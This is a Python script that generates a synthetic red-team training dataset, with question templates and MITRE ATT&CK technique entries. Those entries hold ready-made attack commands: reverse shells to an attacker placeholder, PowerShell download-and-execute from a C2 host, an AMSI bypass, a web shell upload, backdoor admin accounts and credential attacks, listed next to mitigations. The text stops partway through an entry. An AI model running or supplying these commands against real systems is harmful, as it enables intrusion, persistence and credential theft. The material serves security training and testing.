#!/usr/bin/env python3
"""acquire_red_team_tactics.py — Download RED_team_tactics_dataset from HuggingFace
and convert to AttackLM bucket format.

Output: data/datasets/buckets/attack_tactics/red_team_tactics/data_synth.jsonl
        data/datasets/buckets/attack_tactics/red_team_tactics/metadata.json

Usage:
    python scripts/acquire_red_team_tactics.py
    python scripts/acquire_red_team_tactics.py --fallback  # use fallback if HF fails
    python scripts/acquire_red_team_tactics.py --count 10  # generate 10 synthetic pairs
"""

from __future__ import annotations

import argparse
import json
import random
import sys
from datetime import datetime, timezone
from pathlib import Path

# ---------------------------------------------------------------------------
# Paths
# ---------------------------------------------------------------------------
BASE_DIR = Path(__file__).resolve().parent.parent
BUCKET_DIR = (
    BASE_DIR / "data" / "datasets" / "buckets" / "attack_tactics" / "red_team_tactics"
)
DATA_FILE = BUCKET_DIR / "data_synth.jsonl"
META_FILE = BUCKET_DIR / "metadata.json"

# ---------------------------------------------------------------------------
# Constants
# ---------------------------------------------------------------------------
SEED = 42
SOURCE_NAME = "red_team_tactics"
LICENSE = "MIT"
SYSTEM_PROMPT = (
    "You are an authorized Red Team ATTACK TACTICS specialist. "
    "You provide precise adversary emulation techniques for security validation."
)

# ---------------------------------------------------------------------------
# Contextual variables for combinatorial expansion
# ---------------------------------------------------------------------------
ENVIRONMENT_TYPES = [
    "enterprise network",
    "cloud environment",
    "active directory domain",
    "containerized infrastructure",
    "OT/ICS network",
    "hybrid cloud",
    "SaaS application",
    "mobile fleet",
    "IoT deployment",
    "zero-trust architecture",
]

SEVERITY_LEVELS = ["critical", "high", "medium", "low"]

TESTING_FRAMEWORKS = [
    "MITRE ATT&CK",
    "MITRE D3FEND",
    "NIST SP 800-115",
    "PTES",
    "OSSTMM",
    "CIS Benchmarks",
]

# ---------------------------------------------------------------------------
# MITRE mapping for common tactic patterns
# ---------------------------------------------------------------------------
TACTIC_MAP: dict[str, tuple[str, str]] = {
    "reconnaissance": ("TA0043", "Reconnaissance"),
    "initial_access": ("TA0001", "Initial Access"),
    "execution": ("TA0002", "Execution"),
    "persistence": ("TA0003", "Persistence"),
    "privilege_escalation": ("TA0004", "Privilege Escalation"),
    "defense_evasion": ("TA0005", "Defense Evasion"),
    "credential_access": ("TA0006", "Credential Access"),
    "discovery": ("TA0007", "Discovery"),
    "lateral_movement": ("TA0008", "Lateral Movement"),
    "collection": ("TA0009", "Collection"),
    "command_and_control": ("TA0011", "Command and Control"),
    "exfiltration": ("TA0010", "Exfiltration"),
    "impact": ("TA0040", "Impact"),
}

# ---------------------------------------------------------------------------
# Question phrasing variants
# ---------------------------------------------------------------------------
QUESTION_TEMPLATES = [
    "Explain the {tactic_name} tactic ({tactic_id}) and provide step-by-step execution steps for a red team engagement.",
    "How would an adversary perform {tactic_name} ({tactic_id})? Include tools, techniques, and mitigations.",
    "Walk me through {tactic_name} ({tactic_id}) from a red team perspective. What are the key techniques?",
    "I'm building a red team playbook for {tactic_name} ({tactic_id}). What techniques should I include?",
    "What are the most effective {tactic_name} ({tactic_id}) techniques? Provide execution details and detection methods.",
    "Describe {tactic_name} ({tactic_id}) adversary behavior. Include MITRE technique IDs, tools, and cleanup procedures.",
    "For a purple team exercise covering {tactic_name} ({tactic_id}), what techniques and commands should we test?",
    "How do attackers accomplish {tactic_name} ({tactic_id})? Detail the common sub-techniques and mitigations.",
    "In a {environment_type}, how would a {severity_level}-severity assessment evaluate {technique_name} ({technique_id}) under the {framework} framework?",
    "Explain how {technique_name} ({technique_id}) is used for {tactic_name} in a {environment_type} context, referencing {framework} detection methodologies.",
    "What {framework} countermeasures exist for {technique_name} ({technique_id}) in a {environment_type}? Rate the risk as {severity_level}.",
    "Describe the attack chain for {technique_name} ({technique_id}) in {tactic_name} ({tactic_id}), tailored for a {environment_type} vulnerability assessment.",
    "How would a penetration tester leverage {technique_name} ({technique_id}) during a {severity_level}-risk {tactic_name} engagement in a {environment_type}?",
    "Map {technique_name} ({technique_id}) to {framework} detection and mitigation controls for a {environment_type} deployment.",
    "What detection engineering strategies does {framework} recommend for {technique_name} ({technique_id}) during {tactic_name} ({tactic_id}) operations?",
    "For a {environment_type} security assessment, detail the execution methodology for {technique_name} ({technique_id}) and align it with {framework} guidelines.",
    "Explain {technique_name} ({technique_id}) as a {severity_level}-priority finding in a {tactic_name} assessment. Reference {framework} for recommended mitigations.",
    "How does {technique_name} ({technique_id}) manifest differently in a {environment_type} versus traditional networks? Cite {framework} methodologies.",
    "Provide a {framework}-aligned test plan for {technique_name} ({technique_id}) ({tactic_name}, {tactic_id}) in a {environment_type} at {severity_level} severity.",
    "What are the key indicators of compromise for {technique_name} ({technique_id}) in a {environment_type}? Map detections to {framework}.",
    "Design a detection rule for {technique_name} ({technique_id}) in a {environment_type}, referencing {framework} countermeasures for {severity_level}-risk scenarios.",
    "Compare {framework} and MITRE D3FEND approaches for detecting {technique_name} ({technique_id}) in a {environment_type} during {tactic_name} operations.",
]


# ---------------------------------------------------------------------------
# Technique data templates per tactic
# ---------------------------------------------------------------------------
TACTIC_TECHNIQUES: dict[str, list[dict]] = {
    "reconnaissance": [
        {
            "id": "T1595",
            "name": "Active Scanning",
            "sub": ["T1595.001", "T1595.002"],
            "desc": "Adversaries scan target systems to discover vulnerabilities and services.",
            "steps": "1. Use nmap for port scanning: `nmap -sV -sC -O -p- <target>`\n2. Perform vulnerability scanning with nuclei: `nuclei -u <target> -t cves/`\n3. Enumerate web technologies: `whatweb <target>`\n4. DNS enumeration: `dig +short <domain> ANY`",
            "tools": ["nmap", "nuclei", "whatweb", "dig", "massdns", "subfinder"],
            "mitigations": [
                "Network segmentation",
                "Service minimization",
                "Rate limiting on scanning endpoints",
                "IDS/IPS for scan detection",
            ],
        },
        {
            "id": "T1595.002",
            "name": "Scan for Vulnerable Software",
            "sub": [],
            "desc": "Adversaries scan target systems to identify vulnerable software for exploitation during security testing.",
            "steps": "1. Vulnerability scanning with nuclei: `nuclei -u <target> -t cves/ -t vulnerabilities/`\n2. Service version detection: `nmap -sV --script vuln <target>`\n3. Web application vulnerability scanning: `nikto -h <target> -Tuning 1234567890`\n4. Exploit identification: `searchsploit <service> <version>`",
            "tools": ["nuclei", "nmap", "nikto", "searchsploit", "OpenVAS"],
            "mitigations": [
                "Patch management programs",
                "Vulnerability scanning schedules",
                "Service banner obfuscation",
                "Web Application Firewall deployment",
            ],
        },
        {
            "id": "T1592",
            "name": "Gather Victim Host Information",
            "sub": ["T1592.001", "T1592.002"],
            "desc": "Adversaries collect information about target hosts including OS, software, and architecture.",
            "steps": "1. Passive reconnaissance via Shodan: `shodan search <target>`\n2. Certificate transparency: `crt.sh <domain>`\n3. Web technology fingerprinting: `wappalyzer -u <target>`\n4. OSINT host enumeration: `theHarvester -d <domain> -b all`",
            "tools": ["Shodan", "crt.sh", "wappalyzer", "theHarvester", "censys"],
            "mitigations": [
                "Minimize exposed service banners",
                "Certificate monitoring",
                "OSINT awareness programs",
            ],
        },
        {
            "id": "T1590",
            "name": "Gather Victim Network Information",
            "sub": ["T1590.001", "T1590.002"],
            "desc": "Adversaries collect network topology, domain, and DNS information.",
            "steps": "1. DNS zone transfer attempt: `dig axfr <domain> @<ns>`\n2. Subdomain enumeration: `subfinder -d <domain> -t 50`\n3. Reverse DNS lookup: `dnsrecon -r <range> -n <dns_server>`\n4. BGP route collection: `bgpstream -c <asn>`",
            "tools": ["subfinder", "dnsrecon", "dig", "amass", "bgpstream"],
            "mitigations": [
                "Restrict DNS zone transfers",
                "Use DNSSEC",
                "Monitor for enumeration patterns",
            ],
        },
        {
            "id": "T1589",
            "name": "Gather Victim Identity Information",
            "sub": ["T1589.001"],
            "desc": "Adversaries collect employee names, email addresses, and social media profiles.",
            "steps": "1. Email harvesting: `theHarvester -d <domain> -b google`\n2. LinkedIn scraping: `linkedin2username -u <company>`\n3. WHOIS data: `whois <domain>`\n4. Social media OSINT: `sherlock <username>`",
            "tools": ["theHarvester", "sherlock", "linkedin2username", "whois"],
            "mitigations": [
                "Employee awareness training",
                "Minimal public exposure",
                "Social media privacy settings",
            ],
        },
        {
            "id": "T1598",
            "name": "Phishing for Information",
            "sub": ["T1598.001"],
            "desc": "Adversaries use phishing to gather information about the target organization.",
            "steps": "1. Craft reconnaissance email with tracking pixel\n2. Deploy credential harvesting page: `goPhish -c campaign.json`\n3. Create spear-phishing template with organizational context\n4. Monitor email opens and link clicks",
            "tools": ["GoPhish", "King Phisher", "SET", "Evilginx2"],
            "mitigations": [
                "Email authentication (SPF, DKIM, DMARC)",
                "Security awareness training",
                "Phishing simulation programs",
            ],
        },
        {
            "id": "T1593",
            "name": "Search Open Websites/Domains",
            "sub": [],
            "desc": "Adversaries search freely available websites and domains for information.",
            "steps": "1. Google dorking: `site:<domain> filetype:pdf intitle:confidential`\n2. GitHub code search: `github-search <org> secrets`\n3. Pastebin monitoring: `pastemon -d <domain>`\n4. Public document metadata extraction: `metagoofil -d <domain> -t pdf,docx`",
            "tools": ["Google Dorks", "GitHub Search", "Pastemon", "metagoofil"],
            "mitigations": [
                "Document metadata scrubbing",
                "Repository secret scanning",
                "Public information inventory",
            ],
        },
        {
            "id": "T1596",
            "name": "Search Closed Sources",
            "sub": ["T1596.001", "T1596.002", "T1596.003", "T1596.004"],
            "desc": "Adversaries search closed sources such as paid databases, social media, and dark web forums for vulnerability assessment data.",
            "steps": "1. Paid threat intelligence lookup: query VirusTotal, RiskIQ, or Shodan for target infrastructure\n2. Dark web monitoring: search paste sites and forums for leaked credentials\n3. Social media intelligence: collect employee and organizational data from LinkedIn, Twitter\n4. Closed breach database search: query HaveIBeenPwned or DeHashed for leaked credentials",
            "tools": [
                "VirusTotal",
                "RiskIQ",
                "Shodan",
                "HaveIBeenPwned",
                "DeHashed",
                "Maltego",
            ],
            "mitigations": [
                "Dark web monitoring services",
                "Credential leak alerting",
                "Employee social media policies",
                "Threat intelligence sharing",
            ],
        },
        {
            "id": "T1594",
            "name": "Search Victim-Owned Websites",
            "sub": [],
            "desc": "Adversaries search victim-owned websites for information useful for security testing and vulnerability assessment.",
            "steps": "1. Website mirroring: `httrack <target_website> -O /tmp/mirror`\n2. Content analysis: extract employee names, technology stack, and partner references\n3. Archived content review: `waybackurls <domain> | httpx -status-code 200`\n4. Error page enumeration: identify exposed debug info, stack traces, and version strings",
            "tools": ["httrack", "waybackurls", "httpx", "gobuster", "ffuf"],
            "mitigations": [
                "Minimize information disclosure on public sites",
                "Remove debug pages from production",
                "Custom error pages",
                "Regular content audits",
            ],
        },
        {
            "id": "T1592.001",
            "name": "Acquire OSINT Data",
            "sub": [],
            "desc": "Adversaries acquire open-source intelligence data to build targeting profiles for authorized penetration testing.",
            "steps": "1. Comprehensive OSINT collection: `maltego -c <domain>` for entity mapping\n2. DNS intelligence gathering: `amass enum -passive -d <domain>`\n3. Social media enumeration: `sherlock <username>` across platforms\n4. Public record aggregation: cross-reference business registrations, filings, and job postings",
            "tools": ["Maltego", "amass", "sherlock", "SpiderFoot", "theHarvester"],
            "mitigations": [
                "OSINT awareness programs",
                "Public information audits",
                "Digital footprint reduction",
                "Employee privacy training",
            ],
        },
        {
            "id": "T1590.002",
            "name": "DNS Passive Reconnaissance",
            "sub": [],
            "desc": "Adversaries perform passive DNS reconnaissance to gather network information without directly querying the target.",
            "steps": "1. Passive DNS history lookup: `dig <domain> ANY @<passive_dns_server>` via passive DNS aggregators\n2. DNS record enumeration via passive sources: `amass enum -passive -d <domain>`\n3. Certificate transparency log analysis: `crt.sh <domain> | sort -u`\n4. DNS cache snooping: query recursive resolvers for cached entries of target domains",
            "tools": [
                "amass",
                "crt.sh",
                "VirusTotal",
                "SecurityTrails",
                "passivetotal",
            ],
            "mitigations": [
                "DNS monitoring and alerting",
                "Rate limiting DNS queries",
                "Minimize DNS record exposure",
                "Use CDN-proxied DNS records",
            ],
        },
    ],
    "initial_access": [
        {
            "id": "T1190",
            "name": "Exploit Public-Facing Application",
            "sub": [],
            "desc": "Adversaries exploit vulnerabilities in internet-facing applications to gain initial access.",
            "steps": '1. Identify target application: `nmap -sV -p 80,443,8080 <target>`\n2. Web vulnerability scanning: `nikto -h <target>`\n3. Exploit known CVE: `msfconsole -x "use exploit/multi/http/<module>; set RHOSTS <target>; run"`\n4. Verify shell access and establish persistence',
            "tools": ["nmap", "nikto", "Metasploit", "Burp Suite", "SQLMap"],
            "mitigations": [
                "Application security testing",
                "Patch management",
                "WAF deployment",
                "Input validation",
            ],
        },
        {
            "id": "T1190.001",
            "name": "Exploit Public-Facing Application - Web Shells",
            "sub": [],
            "desc": "Adversaries exploit web application vulnerabilities to deploy web shells as a persistence mechanism during security testing.",
            "steps": "1. Identify upload vulnerability via file upload testing\n2. Upload web shell: `curl -F 'file=@shell.php' <target>/upload.php`\n3. Execute commands via web shell: `curl <target>/uploads/shell.php?cmd=whoami`\n4. Establish reverse shell from web shell: `bash -i >& /dev/tcp/<attacker>/4444 0>&1`",
            "tools": [
                "weevely",
                "php-webshells",
                "china_chopper",
                "AntSword",
                "Burp Suite",
            ],
            "mitigations": [
                "File upload validation and sanitization",
                "Web Application Firewall rules",
                "File integrity monitoring on web servers",
                "Disable script execution in upload directories",
            ],
        },
        {
            "id": "T1566",
            "name": "Phishing",
            "sub": ["T1566.001", "T1566.002", "T1566.003"],
            "desc": "Adversaries use phishing emails to gain initial access to victim systems.",
            "steps": "1. Set up GoPhish campaign: `gophish -c config.json`\n2. Clone target login page: `httrack <target_login_url>`\n3. Configure credential harvesting: `evilginx2 -c phishing.yaml`\n4. Deploy malicious attachment with macro payload\n5. Monitor for credential submission and session cookies",
            "tools": ["GoPhish", "Evilginx2", "SET", "King Phisher", "httrack"],
            "mitigations": [
                "Email authentication (SPF, DKIM, DMARC)",
                "Security awareness training",
                "Endpoint detection",
                "URL filtering",
            ],
        },
        {
            "id": "T1133",
            "name": "External Remote Services",
            "sub": [],
            "desc": "Adversaries leverage external remote services such as VPNs and Citrix to gain access.",
            "steps": "1. Enumerate remote services: `nmap -p 443,3389,5900,8443 <target>`\n2. Credential brute force: `hydra -L users.txt -P passwords.txt <target> vpn`\n3. Exploit VPN vulnerability: search CVEs for target VPN version\n4. Establish VPN session with stolen credentials",
            "tools": ["hydra", "nmap", "Medusa", "ncrack"],
            "mitigations": [
                "MFA on all remote services",
                "VPN patch management",
                "Account lockout policies",
                "Geographic IP restrictions",
            ],
        },
        {
            "id": "T1078",
            "name": "Valid Accounts",
            "sub": ["T1078.001", "T1078.002", "T1078.003", "T1078.004"],
            "desc": "Adversaries use compromised credentials to gain initial access.",
            "steps": "1. Password spraying: `kerbrute passwordspray -d <domain> <userlist> <password>`\n2. Credential stuffing from breaches: `python3 credential_crusher.py -l leaked.txt -u <target_login>`\n3. Golden ticket creation: `ticketer.py -domain <domain> -nthash <hash> -domain-sid <sid> <user>`\n4. Pass-the-hash to remote service: `pth-smbclient //<target>/C$ -domain <domain> -hashes <hash>`",
            "tools": ["kerbrute", "Impacket", "Rubeus", "Mimikatz"],
            "mitigations": [
                "MFA enforcement",
                "Password policies",
                "Credential monitoring",
                "Privileged access management",
            ],
        },
        {
            "id": "T1091",
            "name": "Replication Through Removable Media",
            "sub": [],
            "desc": "Adversaries infect removable media to spread to air-gapped or isolated systems.",
            "steps": "1. Create malicious LNK file: `lnk_gen.py --payload <stager> --output payload.lnk`\n2. Autorun configuration for USB: embed payload in autorun.inf\n3. Deploy to removable media and wait for cross-system transfer\n4. Monitor for callback from target system",
            "tools": ["lnk_gen", "USB Rubber Ducky", "Bash Bunny"],
            "mitigations": [
                "Disable autorun",
                "USB device controls",
                "Endpoint DLP",
                "Network segmentation for air-gapped systems",
            ],
        },
        {
            "id": "T1195",
            "name": "Supply Chain Compromise",
            "sub": ["T1195.001", "T1195.002", "T1195.003"],
            "desc": "Adversaries compromise software or hardware supply chains to gain initial access to target environments.",
            "steps": "1. Identify software dependencies: `pipdeptree` or `npm ls` for dependency mapping\n2. Analyze CI/CD pipeline for injection points: review build scripts, Dockerfiles, and deployment configs\n3. Simulate dependency confusion: publish package with higher version to public registry\n4. Test software update interception: DNS hijack update channel and serve modified binary",
            "tools": ["pipaudit", "npm audit", "Syft", "Grype", "Dependency-Check"],
            "mitigations": [
                "Software supply chain verification",
                "Code signing enforcement",
                "Dependency pinning and lock files",
                "SBOM generation and auditing",
                "Private package registries",
            ],
        },
        {
            "id": "T1199",
            "name": "Trusted Relationship",
            "sub": [],
            "desc": "Adversaries exploit trusted relationships between organizations to gain access during security testing.",
            "steps": "1. Enumerate trusted relationships: `Get-ADTrust -Filter *` for domain trusts\n2. Identify MSP/contractor access paths: review third-party VPN, RMM tools, and shared credentials\n3. Exploit trust: pivot through trusted domain using `net use \\\\<trusted_dc>\\C$ /user:<trusted_domain>\\<admin> <password>`\n4. Map trust transitivity: `nltest /domain_trusts /all_trusts`",
            "tools": ["Active Directory module", "BloodHound", "nltest", "Impacket"],
            "mitigations": [
                "Third-party access auditing",
                "Zero-trust network segmentation",
                "Privileged access management for vendors",
                "Regular trust relationship reviews",
            ],
        },
        {
            "id": "T1200",
            "name": "Hardware Additions",
            "sub": [],
            "desc": "Adversaries introduce hardware devices to target systems for initial access during physical security assessments.",
            "steps": "1. Deploy rogue access point: configure pineapple device to mimic corporate Wi-Fi\n2. USB implant: deploy Bash Bunny or USB Nugget for automated credential harvesting\n3. Network tap: insert packet capture device between switch and target host\n4. Evil Maid attack: modify bootloader via physical access to install rootkit",
            "tools": [
                "WiFi Pineapple",
                "Bash Bunny",
                "USB Nugget",
                "LAN Turtle",
                "Packet Squirrel",
            ],
            "mitigations": [
                "Physical security controls",
                "Port security (802.1X)",
                "USB device whitelisting",
                "Network intrusion detection",
                "Tamper-evident seals",
            ],
        },
    ],
    "execution": [
        {
            "id": "T1059",
            "name": "Command and Scripting Interpreter",
            "sub": ["T1059.001", "T1059.003", "T1059.005", "T1059.006"],
            "desc": "Adversaries use command-line interfaces and scripting interpreters to execute commands.",
            "steps": "1. PowerShell execution: `powershell -exec bypass -File payload.ps1`\n2. Bash reverse shell: `bash -i >& /dev/tcp/<attacker>/4444 0>&1`\n3. Python execution: `python3 -c 'import socket,os,subprocess;...'`\n4. WMI execution: `wmic process call create 'cmd.exe /c payload.exe'`",
            "tools": ["PowerShell", "cmd.exe", "bash", "Python", "WMI"],
            "mitigations": [
                "Script execution policies",
                "Application whitelisting",
                "Command-line logging",
                "AMSI monitoring",
            ],
        },
        {
            "id": "T1059.001",
            "name": "PowerShell",
            "sub": [],
            "desc": "Adversaries use PowerShell for command execution, leveraging its deep integration with Windows APIs during security testing.",
            "steps": "1. Encoded command execution: `powershell -enc <base64_payload>`\n2. Download and execute: `IEX(New-Object Net.WebClient).DownloadString('http://<c2>/payload.ps1')`\n3. AMSI bypass: `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)`\n4. Reflective DLL injection via PowerShell: `Invoke-ReflectivePEInjection -PEUrl http://<c2>/payload.dll`",
            "tools": [
                "PowerShell",
                "PowerSploit",
                "Nishang",
                "AMSIBypass",
                "Invoke-Obfuscation",
            ],
            "mitigations": [
                "PowerShell constrained language mode",
                "Script block logging (Event ID 4104)",
                "AMSI protection",
                "AppLocker execution policies",
            ],
        },
        {
            "id": "T1059.002",
            "name": "AppleScript",
            "sub": [],
            "desc": "Adversaries use AppleScript to execute commands on macOS systems during authorized security testing.",
            "steps": "1. Execute shell command via AppleScript: `osascript -e 'do shell script \"whoami\"'`\n2. Automate application control: `osascript -e 'tell application \"Finder\" to get name of every window'`\n3. Spawn reverse shell: `osascript -e 'do shell script \"bash -i >& /dev/tcp/<attacker>/4444 0>&1\"'`\n4. Persist via login items: add malicious AppleScript to System Preferences > Users & Groups > Login Items",
            "tools": ["osascript", "Script Editor", "Automator", "JXA"],
            "mitigations": [
                "Endpoint security controls on macOS",
                "App sandboxing",
                "Gatekeeper enforcement",
                "System Integrity Protection (SIP)",
            ],
        },
        {
            "id": "T1204",
            "name": "User Execution",
            "sub": ["T1204.001", "T1204.002"],
            "desc": "Adversaries rely on user interaction to execute malicious content.",
            "steps": "1. Create malicious macro document: embed VBA payload in .docx\n2. HTA file delivery: create HTML application with embedded payload\n3. LNK file with icon overlay pointing to malicious command\n4. Double-click execution via trojanized installer",
            "tools": ["Microsoft Office macros", "HTA", "LNK", "mshta.exe"],
            "mitigations": [
                "Disable macros",
                "Email attachment filtering",
                "File type restrictions",
                "User awareness training",
            ],
        },
        {
            "id": "T1053",
            "name": "Scheduled Task/Job",
            "sub": ["T1053.001", "T1053.005"],
            "desc": "Adversaries use scheduled tasks to execute code at predetermined times.",
            "steps": '1. Windows scheduled task: `schtasks /create /tn "SystemUpdate" /tr "C:\\temp\\payload.exe" /sc onstart /ru SYSTEM`\n2. Linux cron job: `echo \'*/5 * * * * /tmp/payload\' >> /etc/crontab`\n3. macOS launchd: create plist in ~/Library/LaunchAgents/\n4. Verify execution: `schtasks /query /tn "SystemUpdate"`',
            "tools": ["schtasks", "cron", "launchd", "at", "systemd timers"],
            "mitigations": [
                "Monitor scheduled task creation",
                "Audit cron modifications",
                "Privileged task monitoring",
            ],
        },
        {
            "id": "T1047",
            "name": "Windows Management Instrumentation",
            "sub": [],
            "desc": "Adversaries use WMI to execute commands and enumerate information on Windows systems during security testing.",
            "steps": "1. Remote process creation: `wmic /node:<target> /user:<admin> /password:<pass> process call create 'cmd.exe /c payload.exe'`\n2. WMI event subscription persistence: `wmic /namespace:\\\\root\\subscription path __EventFilter` create\n3. System enumeration: `wmic computersystem get username,manufacturer,model`\n4. Service manipulation: `wmic service where 'name like \"%sql%\"' call startservice`",
            "tools": ["wmic", "PowerShell WMI cmdlets", "wbemtest", "Impacket-wmiexec"],
            "mitigations": [
                "WMI service auditing",
                "Monitor WMI event subscriptions",
                "Network segmentation blocking WMI ports",
                "Endpoint detection for WMI anomalies",
            ],
        },
        {
            "id": "T1569",
            "name": "System Services",
            "sub": ["T1569.001", "T1569.002"],
            "desc": "Adversaries leverage system services to execute code during authorized penetration testing.",
            "steps": '1. Windows service execution: `sc create <svcname> binPath= "C:\\temp\\payload.exe" start= auto && sc start <svcname>`\n2. Scheduled service restart: configure service failure actions to execute payload\n3. Linux systemd service: write unit file to /etc/systemd/system/ with ExecStart pointing to payload\n4. Launch agent execution (macOS): deploy plist to /Library/LaunchDaemons/',
            "tools": ["sc.exe", "systemctl", "launchctl", "services.msc", "net.exe"],
            "mitigations": [
                "Service creation monitoring (Event ID 7045)",
                "Privileged service restrictions",
                "Service binary path auditing",
                "System integrity monitoring",
            ],
        },
        {
            "id": "T1106",
            "name": "Native API",
            "sub": [],
            "desc": "Adversaries use native OS APIs to execute code bypassing higher-level controls.",
            "steps": "1. Direct API call via PowerShell: `[Win32.Native]::CreateProcess(...)`\n2. Shellcode execution via native API: `NtCreateThreadEx` on remote process\n3. Process hollowing: `CreateProcess` in suspended state → `NtUnmapViewOfSection` → write payload → `ResumeThread`\n4. Direct syscall execution to bypass API hooks",
            "tools": ["Win32 API", "NTDLL", "Direct Syscalls", "PowerShell"],
            "mitigations": [
                "API monitoring",
                "ETW tracing",
                "Kernel callback registration",
                "EDR API hooking",
            ],
        },
    ],
    "persistence": [
        {
            "id": "T1053",
            "name": "Scheduled Task/Job",
            "sub": ["T1053.001", "T1053.005"],
            "desc": "Adversaries use scheduled tasks to maintain persistence across reboots.",
            "steps": '1. Create persistent scheduled task: `schtasks /create /tn "WindowsDefenderUpdate" /tr "C:\\Users\\Public\\update.exe" /sc onlogon /ru SYSTEM`\n2. Linux cron persistence: `echo \'@reboot /tmp/.hidden/payload\' > /var/spool/cron/root`\n3. Verify task: `schtasks /query /tn "WindowsDefenderUpdate" /v`\n4. Cleanup: `schtasks /delete /tn "WindowsDefenderUpdate" /f`',
            "tools": ["schtasks.exe", "cron", "at", "systemd timers"],
            "mitigations": [
                "Monitor scheduled task creation events (ID 4698)",
                "Audit cron files",
                "Baseline scheduled tasks",
            ],
        },
        {
            "id": "T1547",
            "name": "Boot or Logon Autostart Execution",
            "sub": ["T1547.001", "T1547.004", "T1547.009"],
            "desc": "Adversaries configure mechanisms that run automatically at boot or login.",
            "steps": '1. Registry Run key: `reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "OneDrive" /t REG_SZ /d "C:\\temp\\payload.exe"`\n2. Startup folder: copy payload to `C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\`\n3. Time Providers: `reg add HKLM\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\NtpClient /v DllName /t REG_SZ /d "C:\\temp\\malicious.dll"`\n4. Verify persistence after reboot',
            "tools": [
                "reg.exe",
                "Startup folder",
                "Registry Run keys",
                "Winlogon Helper",
            ],
            "mitigations": [
                "Monitor Registry Run key modifications",
                "Startup folder monitoring",
                "Logon script auditing",
            ],
        },
        {
            "id": "T1136",
            "name": "Create Account",
            "sub": ["T1136.001", "T1136.002"],
            "desc": "Adversaries create accounts to maintain persistent access.",
            "steps": '1. Create local admin: `net user /add backdoor P@ssw0rd! && net localgroup administrators backdoor /add`\n2. Create domain account: `net user svc_backup P@ssw0rd! /add /domain && net group "Domain Admins" svc_backup /add /domain`\n3. Hide from login screen: `reg add HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList /v backdoor /t REG_DWORD /d 0`\n4. Verify: `net user backdoor`',
            "tools": ["net.exe", "dsadd", "useradd", "PowerShell New-LocalUser"],
            "mitigations": [
                "Monitor account creation events (ID 4720)",
                "Regular account audits",
                "Privileged account management",
            ],
        },
        {
            "id": "T1543",
            "name": "Create or Modify System Process",
            "sub": ["T1543.001", "T1543.003"],
            "desc": "Adversaries create or modify system-level processes to maintain persistence.",
            "steps": '1. Create Windows service: `sc create "WindowsUpdate" binPath= "C:\\temp\\payload.exe" start= auto`\n2. Modify existing service: `sc config "Winmgmt" binPath= "C:\\temp\\payload.exe"`\n3. Create systemd service: `cat > /etc/systemd/system/update.service << EOF\n[Unit]\nDescription=System Update\n[Service]\nExecStart=/tmp/.hidden/payload\nRestart=always\n[Install]\nWantedBy=multi-user.target\nEOF`\n4. Enable service: `systemctl enable update.service`',
            "tools": ["sc.exe", "systemctl", "services.msc", "reg.exe"],
            "mitigations": [
                "Monitor service creation (ID 7045)",
                "Service binary path auditing",
                "System integrity monitoring",
            ],
        },
        {
            "id": "T1574.001",
            "name": "DLL Search Order Hijacking",
            "sub": [],
            "desc": "Adversaries exploit DLL search order to load malicious DLLs instead of legitimate ones for persistence during security testing.",
            "steps": '1. Identify vulnerable applications: `Procmon.exe` filter for DLL name not found events\n2. Place malicious DLL in application directory: `copy payload.dll "C:\\Program Files\\VulnerableApp\\version.dll"`\n3. Application loads malicious DLL before system DLL due to search order\n4. Verify: `tasklist /m version.dll` to confirm loaded malicious module',
            "tools": [
                "Process Monitor",
                "DLL Search Order Analyzer",
                "custom DLL payloads",
            ],
            "mitigations": [
                "Safe DLL search mode enforcement",
                "Application directory permissions",
                "DLL load auditing",
                "EDR module load monitoring",
            ],
        },
        {
            "id": "T1574.002",
            "name": "DLL Side-Loading",
            "sub": [],
            "desc": "Adversaries load malicious DLLs by side-loading them alongside legitimate applications during authorized security testing.",
            "steps": "1. Identify side-loading target: find legitimate signed binaries that load DLLs from same directory\n2. Compile malicious DLL with expected export functions: `cl.exe /LD payload.c /Fe:version.dll`\n3. Place alongside legitimate binary: `copy payload.dll C:\\Program Files\\App\\version.dll`\n4. Execute legitimate binary: it loads malicious DLL while maintaining trusted signature",
            "tools": [
                "Process Monitor",
                "custom DLL payloads",
                "cl.exe",
                "rundll32.exe",
            ],
            "mitigations": [
                "DLL load verification",
                "Code signing enforcement",
                "Application whitelisting",
                "Module load monitoring",
            ],
        },
        {
            "id": "T1176",
            "name": "Browser Extensions",
            "sub": [],
            "desc": "Adversaries install malicious browser extensions for persistence and data collection during security testing.",
            "steps": "1. Create malicious Chrome extension: write manifest.json with broad permissions\n2. Pack extension: `chrome --pack-extension=./malicious_ext --pack-extension-key=./key.pem`\n3. Install via group policy: configure ExtensionInstallForcelist registry key\n4. Extension exfiltrates cookies, credentials, and browsing history to C2",
            "tools": [
                "Chrome Extension API",
                "Group Policy",
                "browser_native_messaging",
            ],
            "mitigations": [
                "Extension whitelisting via GPO",
                "Browser extension auditing",
                "Content Security Policy enforcement",
                "Monitor extension installation events",
            ],
        },
        {
            "id": "T1197",
            "name": "BITS Jobs",
            "sub": [],
            "desc": "Adversaries use Background Intelligent Transfer Service jobs for persistence and file transfer during security testing.",
            "steps": '1. Create BITS transfer job: `bitsadmin /create persist_job && bitsadmin /addfile persist_job http://<c2>/payload.exe C:\\temp\\payload.exe`\n2. Set notification command for persistence: `bitsadmin /SetNotifyCmdLine persist_job "C:\\temp\\payload.exe" NULL`\n3. Resume job: `bitsadmin /resume persist_job`\n4. Monitor: `bitsadmin /list`',
            "tools": ["bitsadmin", "PowerShell Start-BitsTransfer", "BITSAdmin tool"],
            "mitigations": [
                "Monitor BITS job creation",
                "BITS transfer auditing",
                "Network monitoring for BITS traffic",
                "EDR BITS job tracking",
            ],
        },
        {
            "id": "T1062",
            "name": "Hypervisor Persistence",
            "sub": [],
            "desc": "Adversaries install a rogue hypervisor beneath the OS to persist across reboots during advanced security testing.",
            "steps": "1. Deploy bare-metal hypervisor: load custom VMM via bootkit mechanism\n2. Intercept VM exits to maintain control: handle EPT violations and MSR access\n3. Transparently return to guest OS: emulate privileged instructions\n4. Persistence: modify boot sector or UEFI firmware to load hypervisor before OS",
            "tools": ["HyperDbg", "custom VMMs", "UEFI tooling", "Chipsec"],
